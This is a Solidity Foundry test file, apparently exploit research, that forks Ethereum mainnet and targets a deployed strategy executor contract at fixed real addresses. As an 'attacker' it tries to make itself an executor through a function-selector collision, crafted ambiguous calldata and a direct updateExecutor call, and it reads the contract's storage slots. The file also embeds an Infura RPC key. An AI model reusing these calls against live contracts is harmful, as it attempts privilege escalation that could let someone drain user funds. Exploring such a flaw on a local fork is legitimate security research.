// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IStrategyExecutor {
    function STRATEGY_STORAGE() external view returns (address);
    function ACTION_EXECUTOR() external view returns (address);
    function executors(address) external view returns (bool);
    function owner() external view returns (address);
    // Using raw call instead of interface to avoid collision
}

interface IStrategyStorage {
    function getStrategyAddress(uint256 id) external view returns (address);
    function strategyExecutor() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract SelectorExploitTest is Test {
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant STRATEGY_STORAGE = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CallSelector0x34b85e74() public {
        console.log("=== TESTING SELECTOR 0x34b85e74 ===\n");
        
        // This selector could be updateExecutor(address,bool) or mintFeeForTierTwo(uint256)
        bytes4 selector = bytes4(0x34b85e74);
        
        console.log("Attacker:", attacker);
        console.log("Is attacker executor before?", IStrategyExecutor(STRATEGY_EXECUTOR).executors(attacker));
        
        vm.startPrank(attacker);
        
        // Try calling as updateExecutor(attacker, true)
        console.log("\n--- Calling as updateExecutor(attacker, true) ---");
        bytes memory calldata1 = abi.encodeWithSelector(selector, attacker, true);
        console.log("Calldata:");
        console.logBytes(calldata1);
        
        (bool success1, bytes memory result1) = STRATEGY_EXECUTOR.call(calldata1);
        console.log("Success:", success1);
        if (!success1 && result1.length > 0) {
            console.log("Revert data:");
            console.logBytes(result1);
        }
        
        // Try calling as mintFeeForTierTwo(0)
        console.log("\n--- Calling as mintFeeForTierTwo(0) ---");
        bytes memory calldata2 = abi.encodeWithSelector(selector, uint256(0));
        console.log("Calldata:");
        console.logBytes(calldata2);
        
        (bool success2, bytes memory result2) = STRATEGY_EXECUTOR.call(calldata2);
        console.log("Success:", success2);
        if (!success2 && result2.length > 0) {
            console.log("Revert data:");
            console.logBytes(result2);
        }
        
        // Try with crafted data that could be interpreted both ways
        console.log("\n--- Calling with crafted data ---");
        // uint256(attacker) could be interpreted as address + bool
        bytes memory calldata3 = abi.encodeWithSelector(selector, uint256(uint160(attacker)));
        console.log("Calldata:");
        console.logBytes(calldata3);
        
        (bool success3, bytes memory result3) = STRATEGY_EXECUTOR.call(calldata3);
        console.log("Success:", success3);
        
        vm.stopPrank();
        
        console.log("\nIs attacker executor after?", IStrategyExecutor(STRATEGY_EXECUTOR).executors(attacker));
    }

    function test_TryDirectUpdateExecutor() public {
        console.log("=== TRYING DIRECT updateExecutor CALL ===\n");
        
        console.log("Is attacker executor before?", IStrategyExecutor(STRATEGY_EXECUTOR).executors(attacker));
        
        vm.startPrank(attacker);
        
        // Call updateExecutor directly
        (bool success,) = STRATEGY_EXECUTOR.call(
            abi.encodeWithSignature("updateExecutor(address,bool)", attacker, true)
        );
        console.log("updateExecutor call success:", success);
        
        vm.stopPrank();
        
        console.log("Is attacker executor after?", IStrategyExecutor(STRATEGY_EXECUTOR).executors(attacker));
    }

    function test_AnalyzeExecutorStorage() public view {
        console.log("=== ANALYZING EXECUTOR STORAGE ===\n");
        
        // Check storage slots
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(STRATEGY_EXECUTOR, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
        
        // Check executor mapping (slot depends on mapping position)
        // executors is likely at slot 2 or similar
        // mapping(address => bool) storage layout: keccak256(key, slot)
        
        address knownExecutor = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // owner
        bytes32 executorSlot = keccak256(abi.encode(knownExecutor, uint256(2)));
        bytes32 executorValue = vm.load(STRATEGY_EXECUTOR, executorSlot);
        console.log("\nExecutor mapping check for owner:");
        console.logBytes32(executorValue);
    }
}
